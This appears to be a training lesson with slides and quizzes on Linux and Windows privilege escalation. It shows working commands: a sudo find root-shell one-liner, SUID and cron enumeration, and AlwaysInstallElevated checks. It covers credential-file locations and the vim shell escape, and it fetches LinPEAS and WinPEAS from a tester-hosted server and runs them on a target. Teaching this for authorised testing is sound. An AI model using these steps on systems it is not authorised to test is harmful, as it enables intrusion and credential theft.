title: Privilege Escalation: Becoming Root/Admin 👑
description: Elevate from a low-privilege user to SYSTEM or root.

slides.title: Why Escalate? ⬆️
slides.content:
# More Power, More Options

A low-privilege shell (`www-data`, `apache`, `IIS APPPOOL`) is **severely restricted**. You often cannot:
- Read sensitive system files (`/etc/shadow`, SAM hive).
- Install software or modify system settings.
- Dump credentials of other users.
- Access other users' home directories.

**Privilege Escalation** is the act of exploiting a bug, misconfiguration, or design flaw to gain **higher privileges** (root on Linux, SYSTEM or Administrator on Windows).

**Two Types:**
- **Vertical Escalation**: Low-priv user -> Administrator/root.
- **Horizontal Escalation**: User A -> User B (different user, same privilege level; often a stepping stone).

quizData.question: You have a shell as 'bob', a standard domain user. You use a technique to access files owned by 'alice' without changing privilege levels. This is an example of:
quizData.explanation: Horizontal movement gains access to another account at the same level, often due to misconfigured permissions.

slides.title: Linux Privilege Escalation Vectors 🐧
slides.content:
# The Path to Root

**1. SUDO Misconfigurations**
Check what commands you can run as root without a password:
```bash
sudo -l
```
If you see `(ALL) NOPASSWD: /usr/bin/find`, you can spawn a root shell:
```bash
sudo find . -exec /bin/sh \; -quit
```

**2. SUID Binaries**
Find files with the SUID bit set (run as owner, usually root):
```bash
find / -perm -u=s -type f 2>/dev/null
```
Common exploitable SUIDs: `find`, `vim`, `python`, `systemctl`.

**3. Writable Cron Jobs**
Check for system cron jobs that run scripts writable by you.
```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

**4. Kernel Exploits**
Old, unpatched kernels are vulnerable to local privilege escalation exploits.
```bash
uname -a
searchsploit linux kernel 3.13
```
*(Use with extreme caution; kernel exploits can crash the system).*

slides.title: Linux PrivEsc: LinPEAS 🛠️
slides.content: Manual enumeration takes time. **LinPEAS** automates the search for misconfigurations.
slides.codeSnippet:
# On Kali: Host LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 8000

# On Target (low-priv shell)
cd /tmp
wget http://192.168.56.102:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

slides.title: Windows Privilege Escalation Vectors 🪟
slides.content:
# Becoming SYSTEM

**1. Unquoted Service Paths**
If a service binary path contains spaces and is not quoted (e.g., `C:\Program Files\My App\app.exe`), Windows tries to execute `C:\Program.exe` if it exists. Place a malicious `Program.exe` there.

**2. AlwaysInstallElevated**
If the registry keys `AlwaysInstallElevated` are set to `1`, any user can install a malicious `.msi` package with SYSTEM privileges.
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**3. SeImpersonatePrivilege (Potato Attacks)**
If your token has `SeImpersonatePrivilege`, you can use **JuicyPotato** or **PrintSpoofer** to impersonate SYSTEM.
```cmd
whoami /priv
```

**4. Saved Credentials**
- **Credential Manager**: `cmdkey /list`
- **Unattended Install Files**: `C:\Windows\Panther\Unattend.xml` (may contain admin passwords).
- **PowerShell History**: `(Get-PSReadlineOption).HistorySavePath`

slides.title: Windows PrivEsc: WinPEAS 🛠️
slides.codeSnippet:
# On Kali
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
python3 -m http.server 8000

# On Target (PowerShell)
cd C:\Users\Public
Invoke-WebRequest -Uri http://192.168.56.102:8000/winPEASx64.exe -OutFile winPEAS.exe
.\winPEAS.exe

quizData.question: You run `sudo -l` and see `(root) NOPASSWD: /usr/bin/vim`. How can you get a root shell?

options.text: You cannot get a shell from vim.

quizData.explanation: Vim can execute shell commands via `:!sh`. If you run vim with sudo, that shell will be root.

slides.title: Kernel Exploit Caution 💀
slides.content:
## Blue Screen of Death (BSOD)

Kernel exploits modify the core of the operating system. A slight mismatch in versions can cause an **immediate crash** (BSOD on Windows, Kernel Panic on Linux). In a production environment, **never run a kernel exploit** without explicit permission and a maintenance window.
